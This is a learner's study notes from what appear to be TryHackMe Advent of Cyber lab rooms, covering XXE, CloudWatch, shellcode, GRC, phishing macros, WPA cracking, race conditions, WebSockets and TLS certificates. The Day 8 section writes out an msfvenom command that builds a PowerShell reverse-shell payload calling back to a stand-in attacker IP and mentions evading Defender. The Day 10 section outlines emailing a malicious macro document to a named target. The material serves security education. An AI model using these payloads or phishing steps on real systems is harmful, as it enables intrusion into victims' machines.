# **Day 5**
- XXE
	- XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

![[Pasted image 20250106115452.png]]
Server responded with it's own /etc/hosts file

in wishlist.php:
```javascript
libxml_disable_entity_loader(false);
$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);
```

"`libxml_disable_entity_loader(false)`"
Allows users to load external entities
i.e) External file references or Request remote servers 
`simplexml_load_string` with the `LIBXML_NOENT` option, the web app resolves external entities
allowing attackers access to sensitive files or allowing them to make unintended requests from the server.

Fix:
- **Disable External Entity Loading**: The primary fix is to disable external entity loading in your XML parser. In PHP, for example, you can prevent XXE by setting `libxml_disable_entity_loader(true)` before processing the XML.
- **Validate and Sanitise User Input**: Always validate and sanitise the XML input received from users. This ensures that only expected data is processed, reducing the risk of malicious content being included in the request. For example, remove suspicious keywords like `/etc/host`, `/etc/passwd`, etc, from the request.
# Day 7
**CloudWatch**

 AWS CloudWatch is a monitoring and observability platform that gives us greater insight into our AWS environment by monitoring applications at multiple levels. CloudWatch provides functionalities such as the monitoring of system and application metrics and the configuration of alarms on those metrics for the purposes of today's investigation, though we want to focus specifically on CloudWatch logs. Running an application in a cloud environment can mean leveraging lots of different services (e.g. a service running the application, a service running functions triggered by that application, a service running the application backend, etc.); this translates to logs being generated from lots of different sources. CloudWatch logs make it easy for users to access, monitor and store the logs from all these various sources. A CloudWatch agent must be installed on the appropriate instance for application and system metrics to be captured.

A key feature of CloudWatch logs that will help the Warevile SOC squad and us make sense of what happened in their environment is the ability to query application logs using filter patterns. Here are some CloudWatch terms you should know before going further:

- **Log Events:** A log event is a single log entry recording an application "event"; these will be timestamped and packaged with log messages and metadata.
- **Log Streams:** Log streams are a collection of log events from a single source.
- **Log Groups:** Log groups are a collection of log streams. Log streams are collected into a log group when logically it makes sense, for example, if the same service is running across multiple hosts.

**What is JQ?**

Earlier, it was mentioned that Cloudtrail logs were JSON-formatted. When ingested in large volumes, this machine-readable format can be tricky to extract meaning from, especially in the context of log analysis. The need then arises for something to help us transform and filter that JSON data into meaningful data we can understand and use to gain security insights. That's exactly what JQ is (and does!). Similar to command line tools like sed, awk and grep, JQ is a lightweight and flexible command line processor that can be used on JSON.

![[Pasted image 20250117163531.png]]

# Day 8 Shellcodes
Before we start, review some important concepts to help you better understand the upcoming content. Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.

- **Shellcode**: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.
- ![anti-virus shield depicting protection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375094892.png)**PowerShell**: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.
- **Windows Defender**: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defences. We will cover the latter one in this task.  
    
- **Windows API**: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`, which we will also use in this task for exploitation.
- **Accessing Windows API through PowerShell Reflection**: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.
- **Reverse shell**: A type of connection in which the target (the machine you're trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox).

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`
cool remote shell

# Day 9 GRC

## Introduction to GRC

Governance, Risk, and Compliance (GRC) plays a crucial role in any organisation to ensure that their security practices align with their personal, regulatory, and legal obligations. Although in general good security practices help protect a business from suffering a breach, depending on the sector in which an organisation operates, there may be external security regulations that it needs to adhere to.

**Governance** ![Crown of governance](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854578.png)

Governance is the function that creates the framework that an organisation uses to make decisions regarding information security. Governance is the creation of an organisation's security strategy, policies, standards, and practices in alignment with the organisation's overall goal. Governance also defines the roles and responsibilities that everyone in the organisation has to play to help ensure these security standards are met.  

![Inspection glass of risk](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854403.png)**Risk  
**

Risk is the function that helps to identify, assess, quantify, and mitigate risk to the organisation's IT assets. Risk helps the organisation understand potential threats and vulnerabilities and the impact that they could have if a threat actor were to execute or exploit them. By simply turning on a computer, an organisation has some level of risk of a cyber attack. The risk function is important to help reduce the overall risk to an acceptable level and develop contingency plans in the event of a cyber attack where a risk is realised.  

**Compliance**![Clipboard of compliance](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854574.png) 

Compliance is the function that ensures that the organisation adheres to all external legal, regulatory, and industry standards. For example, adhering to the [GDPR law](https://gdpr-info.eu/) or aligning the organisation's security to an industry standard such as NIST or ISO 27001.

## Performing a Risk Assessment

﻿Every business's main goal is to generate revenues and profits. For most businesses, cyber security does not directly contribute to revenue generation or profit maximisation. Businesses decide to spend part of their hard-earned revenue on cyber security to avoid the risk of revenue or reputation loss resulting from a cyber threat. Businesses often take these steps to achieve this goal. We will now work through the process of completing a risk register. A risk register tracks the progress of risk mitigation and all open risks. An example of such a risk register is shown in the animation below. Let's take a look at the steps required to add risks to the risk register.

![an animation of filling out a risk assessment form](https://assets.tryhackme.com/additional/aoc2024/gifs/day9-2.gif)  

**Identification of Risks**

To assess risk, we must first identify the factors that can cause revenue or reputation loss resulting from cyber threats. This exercise requires carefully assessing the attack surface of the organisation and identifying areas which might be used to harm the organisation. Examples of identified risks can be:

- An unpatched web server.
- A high-privileged user account without proper security controls.
- A third-party vendor who might be infected by a malware connecting to the organisation's network.
- A system for which support has ended by the vendor and it is still in production.

An organisation might identify several other risks in addition to these examples. However, in addition to just identifying risks, these risks also need to be quantified. After all, the likelihood of materialising a risk on a cordoned-off and isolated server differs greatly from that of a public-facing server hosting a web frontend. Similarly, the impact of a risk materializing on a crown jewel, such as a main database server containing confidential information, differs greatly from that of a development server with dummy data. 

﻿**Assigning Likelihood to Each Risk**

﻿To quantify risk, we need to identify how likely or probable it is that the risk will materialise.![Choosing likelihood for each risk](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730225302945.png) We can then assign a number to quantify this likelihood. This number is often on a scale of 1 to 5. The exact scale differs from organisation to organisation and from framework to framework. Likelihood can also be called the probability of materialisation of a risk. An example scale for likelihood can be:

1. **Improbable:** So unlikely that it might never happen.
2. **Remote:** Very unlikely to happen, but still, there is a possibility.
3. **Occasional:** Likely to happen once/sometime.
4. **Probable:** Likely to happen several times.
5. **Frequent:** Likely to happen often and regularly.

It might be noticed that while we are trying to quantify the risk, we still don't define exact quantities of what constitutes several times and what constitutes regularly, etc. The reason is that the likelihood for a server which has very high uptime requirements will be different from a server that is used infrequently. Therefore, the likelihood scale will differ from case to case and from asset to asset. On the flip side, we can see that this scale provides us with a very usable scale of differentiating between different probabilities of occurrence of a certain event.

**Assigning Impact to Each Risk**

Once we have identified the risks and the likelihood of a risk, the next step is to quantify the impact this risk's materialisation might have on the organisation. For example, if there is a public-facing web server that is unpatched and gets breached, what will be the impact on the organisation?![Assigning a impact rating to risks](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1732025443659.png) Different organisations calculate impact in different ways. Some organisations might use the CVSS scoring to calculate the impact of a risk; others might use their own rating derived from the Confidentiality, Integrity, and Availability of a certain asset, and others might base it on the severity categorisation of the incidents. Similar to likelihood, we also quantify impact, often on a scale of 1 to 5. An example scale of impact can be based on the following definitions.

1. **Informational:** Very low impact, almost non-existent.
2. **Low:** Impacting a limited part of one area of the organisation's operations, with little to no revenue loss.
3. **Medium:** Impacting one part of the organisation's operations completely, with major revenue loss.
4. **High:** Impacting several parts of the organisation's operations, causing significant revenue loss
5. **Critical:** Posing an existential threat to the organisation.

**Risk Ownership  
**

The last step to performing a risk assessment is to decide what to do with the risks that were found. We can start by performing some calculations on the risk itself. The simplest calculation takes the likelihood of the risk and multiplies it with the impact of the risk to get a score.![Tagging an owner for the risk](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730225302939.png) Some risk registers make use of more advanced rating systems such as DREAD. Assigning scores to the risks helps organisations prioritise which risks should be remediated first.

While you may think the simplest answer is to secure the system so there is no risk, in real life, it isn't that simple. Implementing more security costs more money, and it doesn't help if we spend more money on security than what we risk losing if we leave open the risk.

In this last step, we decide who owns the risks that were identified. These team members are then responsible for performing an additional investigation into what the cost would be to close the risk vs what we could lose if the risk is realised. In cases where the cost of security is lower, we can **mitigate** the risk with more security controls. However, were it is higher, we can **accept** the risk. Accepted risks should always be documented and reviewed periodically to ensure that the cost has not changed.

## Internal and Third-Party Risk Assessments

Risk assessments are not just done internally in an organisation, but can also be used to assess the risk that a third party may hold to our organisation. Today, it is very common to make use of third parties to outsource key functions of your business. For example, a small organisation may outsource its financial division to a large auditing firm, or a large organisation may outsource the development of some of its applications to a software engineering firm. However, this changes the risk as a compromise of the third party, where we may not have full control over their security, could still result in a compromise of our data or sensitive assets. As such, we need to consider the risk the third party poses to us.

**Why Do Companies Do Internal Risk Assessments?**

Internal risk assessments help companies understand the risks they have within their own walls. It's like taking a good look around your house to check if there are any leaks or broken windows.

For example, if a company finds that its software is outdated, it can prioritise updating it to prevent potential attacks. Internal risk assessments help:

- Identify weak spots in security.
- Direct resources to the most important areas.
- Stay compliant with security rules and regulations.  
    

**Why Do Companies Do Risk Assessments of Third Parties?**

Companies don't just assess themselves—they also need to evaluate the risks that come from working with other companies, like vendors, suppliers, or partners. This is called a third-party risk assessment, and it's important because one weak link in the chain can affect everyone.

Let's make it simple: McSkidy and Glitch want to make sure that whichever eDiscovery company they choose won't leak or lose sensitive data. So, they will be reviewing if these companies:

- Have good security measures to keep data safe.
- Follow data protection rules.
- Align with the security standards that McSkidy and Glitch have in place.  
    

By doing a third-party risk assessment, McSkidy and Glitch are reducing potential supply chain risks - making sure the investigation doesn't run into trouble because of a weak security link in the chain. In order to do this, McSkidy has to create a risk assessment that can be sent to the potential third parties. Based on the answers provided by the third parties, McSkidy can then make an informed decision on which third party would be best!


# Day 10 Phishing
## Phishing Attacks

Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.

Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.

One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.

## Macros

The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.

In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.

To add a macro to an MS Word document for instance, we click on the **View** menu and then select **Macros** as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the **Create** button.

## Attack Plan

In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:

1. Create a document with a malicious macro
2. Start listening for incoming connections on the attacker’s system
3. Email the document and wait for the target user to open it
4. The target user opens the document and connects to the attacker’s system
5. Control the target user’s system

You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.


https://www.metasploit.com/
Create malware doc

# Day 11 Wifi
## What is Wi-Fi

The importance of the Internet in our lives is universally acknowledged without the need for any justification. Wi-Fi is the technology that connects our devices to the global network, the Internet. This seamless connection to the Internet appears to be wireless from our devices, which is true to some extent. Our devices are connected wirelessly to the router, which acts as a bridge between us and the Internet, and the router is connected to the Internet via a wired connection.

To connect to Wi-Fi, we turn it on from our devices, and it lists all the available Wi-Fi networks around us. This list comprises the access points (often the routers) that are broadcasting Wi-Fi signals with a unique **SSID** (network name). You can connect to any of these if you know the correct password, also known as a pre-shared key (**PSK**). Once you successfully connect to a network via Wi-Fi, you will be assigned an IP address inside that network, which will uniquely identify you and help you communicate with other devices. It is just like becoming a member of a family assigned with a name that the whole family trusts.

The image below shows an example of what connecting to an **OK443S SSID** requesting a PSK (password) looks like on a typical Windows machine:

![How connecting to an SSID (OK443S) requesting a PSK (password) looks like on a typical Windows machine.](https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730574010264.png)  

With all this discussion on Wi-Fi, it seems like a door to our internet access, and every Wi-Fi connection forms a family of devices. Would you allow somebody you don't really know to become part of your family? Not that easy! Probably because of the privileges a family member has, nobody from outside should ever get those.

## Wi-Fi's Pivotal Role in Organisations![Byte The Dog character.](https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115481.png)

Most organisations rely on the Internet for their business functioning. Using a wired connection for all employees to connect to the Internet raises concerns about cost, efficiency, and flexibility at work. So, organisations use Wi-Fi for their networks to connect their employees to the Internet. As the employees connect to the organisation's network, they form a family of interconnected devices. The devices inside the network can communicate with each other and request or respond to any request. Organisations tend to recruit trustworthy and professional employees to avoid any misuse of their privileges inside the network.

However, a malicious actor from outside the organisation could still see the broadcasted Wi-Fi **SSID** of the organisation's network when they turn their Wi-Fi on. This may not seem to be a problem as the attacker does not know the password, but the attacker actually has some other plans as well!

![A disc with a wifi logo being split in two.](https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-1.gif)

## Attacks on Wi-Fi

There are several techniques attackers use to exploit Wi-Fi technology. The techniques discussed here are solely for educational purposes. Unauthorised attempts to access or compromise networks are illegal and may lead to severe legal consequences. With that in mind, here are some of the most popular techniques:

- **Evil twin attack:** In this attack, the attacker creates a fake access point that has a similar name to one of your trusted Wi-Fi access points. Of course, it cannot be the exact same. If the trusted Wi-Fi's name is "Home_Internet", the attacker creates a fake Wi-Fi access point named "Home_Internnet" or something similar that is difficult to differentiate. The attack starts with the attacker sending de-authentication packets to all the users connected to their legitimate Wi-Fi access points. The users would face repeated disconnections from the network after this. With frustration, the users are likely to open the Wi-Fi access points list for troubleshooting and will find the attacker's Wi-Fi with almost similar name and with greater signal strength. They would go to connect it, and once connected, the attacker could see all their traffic to or from the Internet.
- **Rogue access point:** This attack's objective is similar to that of the evil twin attack. In this attack, the attacker sets up an open Wi-Fi access point near or inside the organisation's physical premises to make it available to users with good signal strength. The users inside the organisation may accidentally join this network if their devices are set to connect automatically to open Wi-Fi. The attacker can intercept all their communication after the users connect to this rogue access point.
- **WPS attack:** Wi-Fi Protected Setup (WPS) was created to allow users to connect to their Wi-Fi using an 8-digit PIN without remembering complex passwords. However, this 8-digit PIN is vulnerable in some networks due to its insecure configuration. The attack is made by initiating a WPS handshake with the router and capturing the router's response, which contains some data related to the PIN and is vulnerable to brute-force attacks. Some of the captured data is brute-forced, and the PIN is successfully extracted along with the Pre-Shared Key (PSK).
- **WPA/WPA2 cracking:** Wi-Fi Protected Access (WPA) was created to secure wireless communication. It uses a strong encryption algorithm. However, the security of this protocol is heavily influenced by the length and complexity of the Pre-Shared Key (PSK). While cracking WPA, attackers start by sending de-authentication packets to a legitimate user of the Wi-Fi network. Once the user disconnects, they try to reconnect to the network, and a 4-way handshake with the router takes place during this time. Meanwhile, the attacker turns its adaptor into monitor mode and captures the handshake. After the handshake is captured, the attacker can crack the password by using brute-force or dictionary attacks on the captured handshake file.

McSkidy looks to Glitch and asks, _"What kind of attack are you thinking of demonstrating Glitch?"_

Glitch paces back and forth before coming to a sudden stop and says, _"Today I will be showing you how the WPA/WPA2 cracking attack works!"_

## WPA/WPA2 Cracking

As mentioned above, WPA/WPA2 cracking begins by listening to Wi-Fi traffic to capture the 4-way handshake between a device and the access point. Since waiting for a device to connect or reconnect can take some time, deauthentication packets are sent to disconnect a client, forcing it to reconnect and initiate a new handshake, which is captured. After the handshake is captured, the attacker can crack the password (**PSK**) by using brute-force or dictionary attacks on the captured handshake file.

![the attacker's network card listening in monitor mode, to capture a handshake between a device and an access point](https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-2.gif)

**The 4-way Handshake**

The WPA password cracking process involves capturing a Wi-Fi network's handshake to attempt a PSK (password) decryption. First, an attacker places their wireless adapter into monitor mode to scan for networks, then targets a specific network to capture the 4-way handshake. Once the handshake is captured, the attacker runs a brute-force or dictionary attack using a tool like aircrack-ng to attempt to match a wordlist against the passphrase.

The WPA 4-way handshake is a process that helps a client device (like your phone or laptop) and a Wi-Fi router confirm they both have the right "password" or Pre-Shared Key (PSK) before securely connecting. Here's a simplified rundown of what happens:

- **Router sends a challenge:** The router (or access point) sends a challenge" to the client, asking it to prove it knows the network's password without directly sharing it.
- **Client responds with encrypted information:** The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.
- **Router verifies and sends confirmation:** If the router sees the client’s response matches what it expects, it knows the client has the right PSK. The router then sends its own confirmation back to the client.
- **Final check and connection established:** The client verifies the router's response, and if everything matches, they finish setting up the secure connection.

This handshake doesn't directly reveal the PSK itself but involves encrypted exchanges that depend on the PSK.

**The Vulnerability**

The vulnerability lies in the fact that an attacker can capture this 4-way handshake if they’re listening when a device connects. With the handshake data, they can use it as a basis to attempt offline brute-force or dictionary attacks. Essentially, they try different possible passwords and test each one to see if it would produce the captured handshake data, eventually cracking the PSK if they get a match.



![[Pasted image 20250120123549.png]]![[Pasted image 20250120123600.png]]
![[Pasted image 20250120123609.png]]![[Pasted image 20250120123619.png]]
![[Pasted image 20250120123629.png]]
![[Pasted image 20250120123643.png]]
![[Pasted image 20250120123655.png]]
![[Pasted image 20250120123704.png]]
![[Pasted image 20250120123713.png]]![[Pasted image 20250120123721.png]]

# Day 12 Web timing attacks 
## Web Timing and Race Conditions

Conventional web applications are relatively easy to understand, identify, and exploit. If there is an issue in the code of the web application, we can force the web application to perform an unintended action by sending specific inputs. These are easy to understand because there is usually a direct relationship between the input and output. We get bad output when we send bad data, indicating a vulnerability. But what if we can find vulnerabilities using only good data? What if it isn't about the data but how we send it? This is where web timing and race condition attacks come into play! Let's dive into this crazy world and often hidden attack surface!   

In its simplest form, a web timing attack means we glean information from a web application by reviewing how long it takes to process our request. By making tiny changes in what we send or how we send it and observing the response time, we can access information we are not authorised to have.

Race conditions are a subset of web timing attacks that are even more special. With a race condition attack, we are no longer simply looking to gain access to information but can cause the web application to perform unintended actions on our behalf.  

Web timing vulnerabilities can be incredibly subtle. Based on the following [research](https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work), response time differences ranging from 1300ms to 5ns have been used to stage attacks. Because of their subtle nature, they can also be hard to detect and often require a wide range of testing techniques. However, with the increase in adoption of HTTP/2, they have become a bit easier to find and exploit.

## The Rise of HTTP/2

HTTP/2 was created as a major update for HTTP, the protocol used for web applications. While most web applications still use HTTP/1.1, there has been a steady increase in the adoption of HTTP/2, as it is faster, better for web performance, and has several features that elevate the limitations of HTTP/1.1. However, if implemented incorrectly, some of these new features can be exploited by threat actors using new techniques.

A key difference in web timing attacks between HTTP/1.1 and HTTP/2 is that HTTP/2 supports a feature called single-packet multi-requests. Network latency, the amount of time it takes for the request to reach the web server, made it difficult to identify web timing issues. It was hard to know whether the time difference was due to a web timing vulnerability or simply a network latency difference. However, with single-packet multi-requests, we can stack multiple requests in the same TCP packet, eliminating network latency from the equation, meaning time differences can be attributed to different processing times for the requests. This is explained more in the animation below:

![an animation showing how HTTP/1 and HTTP/2 deal with timing differences](https://assets.tryhackme.com/additional/aoc2024/gifs/Webtiming2.gif)

With network latency a thing of the past, only server latency remains, making it significantly easier to detect timing issues and exploit them to recover sensitive information.  

## Typical Timing Attacks

Timing attacks can often be divided into two main categories:

- Information Disclosures

Leveraging the differences in response delays, a threat actor can uncover information they should not have access to. For example, timing differences can be used to enumerate the usernames of an application, making it easier to stage a password-guessing attack and gain access to accounts.

- Race Conditions

Race conditions are similar to business logic flaws in that a threat actor can cause the application to perform unintended actions. However, the issue's root cause is how the web application processes requests, making it possible to cause the race condition. For example, if we send the same coupon request several times simultaneously, it might be possible to apply it more than once.

For the rest of this task, we will focus on race conditions. We will take a look at a `Time-of-Check to Time-of-Use (TOCTOU)` flaw. Let's use an example to explain this, as shown in the animation below:

![Demonstrating a Time of Check to Time of Use vulnerability caused by a race condition](https://assets.tryhackme.com/additional/aoc2024/gifs/Webtiming3.gif)

When the user submits their coupon code, in the actual code of the web application, at some point, we perform a check that the coupon is valid and hasn't been used before. We apply the discount, and only then do we update the coupon code to indicate that it has already been used. In this example, between our check if the coupon is valid and our update of the coupon being used, there are a couple of milliseconds where we apply the coupon. While this might seem small, if a threat actor can send two requests so close together in time, it might happen that before the coupon is updated in request 1, it has already been checked in request 2, meaning that both requests will apply the coupon!  

## Winning the Race

Now that you understand basic concepts related to race conditions, let's explore how this vulnerability occurs in a real-world scenario. For this, we will take the example of the Warville banking application hosted on `http://MACHINE_IP:5000/`. This application allows users to log in and transfer funds between accounts.

## Intercepting the Request

Before we start intercepting requests, we need to configure the environment so that, as a pentester, all web traffic from our browser is routed through Burp Suite. This allows us to see and manipulate the requests as we browse.

# Day 13
## Introduction to WebSocket

WebSockets let your browser and the server keep a constant line of communication open. Unlike the old-school method of asking for something, getting a response, and then hanging up, WebSockets are like keeping the phone line open so you can chat whenever you need to. Once that connection is set up, the client and server can talk back and forth without all the extra requests.

WebSockets are great for live chat apps, real-time games, or any live data feed where you want constant updates. After a quick handshake to get things started, both sides can send messages whenever. This means less overhead and faster communication when you need data flowing in real-time.

## Traditional HTTP Requests vs. WebSocket

When you use regular HTTP, your browser sends a request to the server, and the server responds, then closes the connection. If you need new data, you have to make another request. Think of it like knocking on someone's door every time you want something—they'll answer, but it can get tiring if you need updates constantly.

Take a chat app as an example. With HTTP, your browser would keep asking, "Any new messages?" every few seconds. This method, known as polling, works but isn’t efficient. Both the browser and the server end up doing a lot of unnecessary work just to stay updated.

WebSockets handle things differently. Once the connection is established, it remains open, allowing the server to push updates to you whenever there’s something new. It’s more like leaving the door open so updates can come in immediately without the constant back-and-forth. This approach is faster and uses fewer resources.

![Glitch and McSkidy simulating a communication channel using a game of foot-volley.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731327387327.png)

## WebSocket Vulnerabilities

While WebSockets can boost performance, they also come with security risks that developers need to monitor. Since WebSocket connections stay open and active, they can be taken advantage of if the proper security measures aren't in place. Here are some common vulnerabilities:

- **Weak Authentication and Authorisation:** Unlike regular HTTP, WebSockets don't have built-in ways to handle user authentication or session validation. If you don't set these controls up properly, attackers could slip in and get access to sensitive data or mess with the connection.
- **Message Tampering:** WebSockets let data flow back and forth constantly, which means attackers could intercept and change messages if encryption isn't used. This could allow them to inject harmful commands, perform actions they shouldn't, or mess with the sent data.
- **Cross-Site WebSocket Hijacking (CSWSH):** This happens when an attacker tricks a user's browser into opening a WebSocket connection to another site. If successful, the attacker might be able to hijack that connection or access data meant for the legitimate server.
- **Denial of Service (DoS):** Because WebSocket connections stay open, they can be targeted by DoS attacks. An attacker could flood the server with a ton of messages, potentially slowing it down or crashing it altogether.

## What Is WebSocket Message Manipulation?

WebSocket Message Manipulation is when an attacker intercepts and changes the messages sent between a web app and its server. Unlike regular HTTP requests that go back and forth one at a time, WebSockets keep a connection open, allowing constant two-way communication. This is what makes WebSockets great for real-time apps, but it also opens the door for attacks if proper security isn't in place.

In this type of attack, a hacker could intercept and tweak these WebSocket messages as they're being sent. Let's say the app is sending sensitive info, like transaction details or user commands—an attacker could change those messages to make the app behave differently. They could bypass security checks, send unauthorised requests, or alter key data like usernames, payment amounts, or access levels.

For example, imagine a web app using WebSockets to handle money transfers between accounts. If an attacker gets hold of the message before it hits the server, they could change the amount being transferred or even send the money to a different account. Since WebSocket connections happen in real-time, these changes would take effect instantly without the user or server noticing immediately.

This kind of manipulation can also lead to more significant problems. Hackers could inject harmful code or try to get higher-level access. For instance, they might change a message to give themselves admin rights or insert malicious commands to take control of the server.

What makes this attack so dangerous is that WebSocket connections often don't have the same security protections as traditional HTTP connections, like End-to-End Encryption, which encrypts the request body of an HTTP request using JavaScript using an AES key or RSA public key stored in the JavaScript file. If developers don't add vigorous checks like message validation or encryption, it's easy for attackers to exploit these gaps. By tampering with the data being sent, attackers can cause all sorts of damage, from unauthorised actions to full system compromises.

The impact of changing WebSocket messages depends on how the app uses them and what kind of data is being sent. Here's a breakdown of what can happen:

- **Doing Things Without Permission:** If someone can tamper with WebSocket messages, they could impersonate another user and carry out unauthorised actions such as making purchases, transferring funds, or changing account settings. For example, if a WebSocket manages payment transactions, an attacker could manipulate the transaction amount or reroute the payment to their own account.
- **Gaining Extra Privileges:** Attackers could also manipulate messages to make the system think they have more privileges than they actually do. This could let them access admin controls, change user data, view sensitive info, or mess with system settings.
- **Messing Up Data:** One of the significant risks is data corruption. If someone is changing the messages, they could feed bad data into the system. This could mess with user accounts, transactions, or anything else the app handles. They could change things in real-time and disrupt everyone's work in circumstances such as a shared document or tool.
- **Crashing the System:** An attacker could also spam the server with bad requests, causing it to slow down or crash. If this happens enough, the system could go offline, causing serious downtime for users and businesses.

Without good security checks, this kind of message tampering can lead to anything from unauthorised actions to the downing of an entire service.

# Day 14 Certificates
## Certified to Sleigh

We hear a lot about certificates and their uses, but let’s start dissecting what a certificate is:

- **Public key**: At its core, a certificate contains a public key, part of a pair of cryptographic keys: a public key and a private key. The public key is made available to anyone and is used to encrypt data.
- **Private key**: The private key remains secret and is used by the website or server to decrypt the data.
- **Metadata**: Along with the key, it includes metadata that provides additional information about the certificate holder (the website) and the certificate. You usually find information about the Certificate Authority (CA), subject (information about the website, e.g. www.meow.thm), a uniquely identifiable number, validity period, signature, and hashing algorithm.

## Sign Here, Trust Me

So what is a Certificate Authority (CA)?

A CA is a trusted entity that issues certificates; for example, GlobalSign, Let’s Encrypt, and DigiCert are very common ones. The browser trusts these entities and performs a series of checks to ensure it is a trusted CA. Here is a breakdown of what happens with a certificate:

- **Handshake**: Your browser requests a secure connection, and the website responds by sending a certificate, but in this case, it only requires the public key and metadata.
- **Verification:** Your browser checks the certificate for its validity by checking if it was issued by a trusted CA. If the certificate hasn’t expired or been tampered with, and the CA is trusted, then the browser gives the green light. There are different types of checks you can do; check them [here](https://www.sectigo.com/resource-library/dv-ov-ev-ssl-certificates).
- **Key exchange**: The browser uses the public key to encrypt a session key, which encrypts all communications between the browser and the website.
- **Decryption**: The website (server) uses its private key to decrypt the session key, which is [symmetric](https://deviceauthority.com/symmetric-encryption-vs-asymmetric-encryption/). Now that both the browser and the website share a secret key (session key), we have established a secure and encrypted communication!

Ever wonder what makes HTTPS be S (secure)? Thanks to certificates, we can now have authentication, encryption, and data integrity.

**Self-Signed Certificates vs. Trusted CA Certificates**

The process of acquiring a certificate with a CA is long, you create the certificate, and send it to a CA to sign it for you. If you don’t have tools and automation in place, this process can take weeks. Self-signed certificates are signed by an entity usually the same one that authenticates. For example, Wareville owns the GiftScheduler site, and if they create a certificate and sign it with Wareville as a CA, that becomes a self-signed certificate.

- **Browsers** generally do not trust self-signed certificates because there is no third-party verification. The browser has no way of knowing if the certificate is authentic or if it’s being used for malicious purposes (like a **man-in-the-middle attack**).
- **Trusted CA certificates**, on the other hand, are verified by a CA, which acts as a trusted third party to confirm the website’s identity.

